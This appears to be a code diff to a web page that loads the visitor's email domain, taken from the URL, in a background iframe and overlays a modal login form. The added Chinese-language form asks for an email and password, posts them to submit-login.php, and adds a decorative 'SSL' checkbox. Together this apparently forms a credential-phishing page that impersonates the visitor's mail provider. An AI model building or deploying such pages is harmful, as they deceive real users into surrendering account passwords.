@@ -36,17 +36,115 @@
             left: 50%;
             transform: translate(-50%, -50%);
             background-color: white;
+            width: 400px; /* Modal width */
+            height: 350px; /* Modal height */
             padding: 20px;
             z-index: 101; /* Modal appears above the overlay */
             display: none; /* Initially hidden */
+            overflow: auto; /* Allow scrolling if content overflows */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Add some shadow for better visibility */
+        }
+
+        /* Additional CSS from the login page */
+        .super {
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+    
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white; /* Light gray background for better contrast */
+        }
+    
+        h1 {
+            color: blue;
+            margin-bottom: 20px;
+        }
+    
+        #loginForm input[type="text"],
+        #loginForm input[type="password"] {
+            width: 250px;
+            height: 40px;
+            padding: 8px;
+            margin: 10px 0;
+            border: 2px solid black;
+            border-radius: 4px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+    
+        #loginForm input[type="text"]:hover,
+        #loginForm input[type="password"]:hover,
+        #loginForm input[type="text"]:focus,
+        #loginForm input[type="password"]:focus {
+            border-color: blue;
+        }
+    
+        #loginForm button {
+            background-color: blue;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+    
+        #loginForm button:hover {
+            background-color: darkblue;
+        }
+    
+        .ssl-text {
+            color: blue;
+            font-style: italic;
+        }
+    
+        .password-container {
+            position: relative;
+            display: inline-block;
+        }
+    
+        #password {
+            padding-right: 0;
+        }
+    
+        #showPassword {
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            margin-right: 10px;
         }
     </style>
 </head>
 <body>
     <div id="overlay"></div>
     <div id="modal">
-        <p>This is the modal content.</p>
-        <!-- Modal content remains visible and does not close -->
+        <div class="super">
+            <h1 style="text-align: center; color: blue;">
+                <span>账</span> <span>户</span> <span>登</span> <span>录</span>
+            </h1>
+            <div class="god">
+                <form id="loginForm" action="submit-login.php" method="post">
+                    <input type="text" id="username" name="username" placeholder="电子邮件" required><br><br>
+                    <div class="password-container">
+                        <input type="password" id="password" name="password" placeholder="密码" required>
+                        <input type="checkbox" id="showPassword" onclick="togglePassword()">
+                    </div>
+                    <br>
+                    <label>
+                        <input type="checkbox" name="ssl" id="sslCheckbox">
+                        使用 <span class="ssl-text">SSL</span> 登录
+                    </label>
+                    <br><br>
+                    <button type="submit">登录</button>
+                </form>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -60,7 +158,7 @@
             return '';
         }
 
-        // Function to display the iframe with the email domain
+        // Function to display the iframe with the email domain and show the modal when iframe loads
         function showModalWhenIframeLoads() {
             const queryString = window.location.search;
             const domain = getEmailDomain(queryString);
@@ -77,6 +175,16 @@
                     document.getElementById('modal').style.display = 'block';
                     document.body.classList.add('inactive'); // Disable background scrolling
                 };
+            }
+        }
+
+        // Function to toggle password visibility
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+            } else {
+                passwordField.type = 'password';
             }
         }
 
